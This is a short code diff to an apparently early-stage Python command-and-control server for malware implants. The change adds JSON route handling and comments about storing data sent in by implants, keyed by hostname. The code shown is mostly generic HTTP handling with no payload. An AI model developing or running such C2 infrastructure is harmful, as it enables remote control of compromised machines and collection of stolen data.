@@ -5,6 +5,7 @@ import ssl
 import time
 from io import BytesIO
 from cnc_routes.main import routes
+import json
 # will eventually narrow down needed modules
 
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
@@ -24,20 +25,32 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         self.send_response(200)
         self.end_headers()
         response = BytesIO()
-        response.write(b'This is a POST request')
-        response.write(b'Received: ')
-        response.write(body)
+        response.write(b'This is a POST request') # Instead of just 
+        response.write(b'Received: ') # responding with the request POST body data
+        response.write(body) # should instead store received data in a db or dict with hostname as key
         self.wfile.write(response.getvalue())
 
-    def handle_http(self, status, content_type):
+    def handle_http(self):
+        status = 200
+        content_type = "application/json"
+        response_content = ""
+
+        if self.path in routes:
+            print(routes[self.path])
+            response_content = routes[self.path]
+        else:
+            response_content = '{"error":"Not Found"}'
+
         self.send_response(status)
         self.send_header('Content-type', content_type)
         self.end_headers()
-        return bytes("Hello, lol", "UTF-8")
+        return json.dumps(response_content)
+
+
 
     def respond(self):
-        content = self.handle_http(200, 'text/html')
-        self.wfile.write(content)
+        content = self.handle_http()
+        self.wfile.write(bytes(content, "UTF-8"))
 
 def prepare_command(command):
     """takes a terminal command and prepares it for consumption by implant
